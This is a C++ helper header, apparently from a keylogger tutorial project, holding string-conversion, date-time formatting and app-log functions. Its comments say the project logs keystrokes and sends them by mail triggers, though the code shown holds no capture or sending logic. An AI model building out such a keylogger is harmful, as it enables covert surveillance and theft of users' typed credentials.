/**************************************************************************************/
/* ---------------------			GURPREET SINGH			 ------------------------ */
/* Here we've construct a helper header, a file where we'll dump all the function, types, etc. which we can't generally fit anywhere else */
#ifndef HELPER_H
#define HELPER_H

#include<ctime>	//We'll use the helper header to retrieve time, and to be able to make our program in terms of mail sending triggers
#include<string>	//will be used to convert various types into strings, cause we'll use strings to fill our log files( Converting the keystrokes into the strings )
#include<sstream>	//will be the one used to convert various tyoes into the strings
#include<fstream>


// now we'll create our own namespace in order to group function types, thats why its important to use 'std::' 
namespace Helper {
	template <class T>	//to create functions that will accept general types
	std::string ToString(const T &);	//this is actually just a prototype of the function, and this function will be responsible for conversion to string
	
	struct DateTime	{	//Helper struct to represent date and time
		DateTime() {
			time_t ms;
			time(&ms);	//function from ctime library, takes system time and places it into the variable 'ms', thats why we are passing the address of the variable
			
			struct tm *info = localtime(&ms);	//tm --> struct type from the ctime library, points to the return value of the function localtime
			
			D = info->tm_mday;		//D represents DAY, and is an attribute of the struct from DateTime
			m = info->tm_mon+1;		// +1 because months start from 0
			y = 1900+info->tm_year;	//1900 -> reference year
			M = info->tm_min;
			H = info->tm_hour;
			S = info->tm_sec;
		}
		
		DateTime(int D, int m, int y, int H, int M, int S) : D(D), m(m), y(y), H(H), M(M), S(S) { }		//incase user wants to provide the parameters
		DateTime(int D, int m, int y) : D(D), m(m), y(y), H(0), M(0), S(0) { }	//when the time is set to zero
		DateTime Now() const {		//const means it will only read
			return DateTime();
		}
		
		int D, m, y, H, M, S;
		std::string GetDateString() const {		//this will format the datetime in our desired format | in this case --> DD.MM.YYYY
			return  std::string( D < 10 ? "0" : "") + ToString(D) +
					std::string( m < 10 ? ".0" : ".") + ToString(m) + "." +
					ToString(y);
		}
		
		std::string GetTimeString(const std::string &sep = ":") const	{	//
			return 	std::string( H < 10 ? "0" : "") + ToString(H) + sep +
					std::string( M < 10 ? "0" : "") + ToString(M) + sep +
					std::string( S < 10 ? "0" : "") + ToString(S);
		}
		
		std::string GetDateTimeString( const std::string &sep = ":") const {
			return GetDateString() + " " +GetTimeString(sep);
		}
		
		
	};
	
	template <class T>
	std::string ToString(const T &e) {
		std::ostringstream s;		//s--> variable of type ostringstream(outpuy), we'll be placing stuff in it
		s << e;
		return s.str();
	}
	
	//now a function to record the log file of the keylogger to store the behaviour i.e. errors, etc.
	// and the keylogger doesn't depends on this function, so you can remove it also
	void WriteAppLog( const std::string &s) {
		std::ofstream file("AppLog.txt", std::ios::app);
		file << "[" <<Helper::DateTime().GetDateTimeString()<< "]" <<
		"\n" << s <<std::endl << "\n";
		file.close();
	}
}


#endif	//HELPER_H
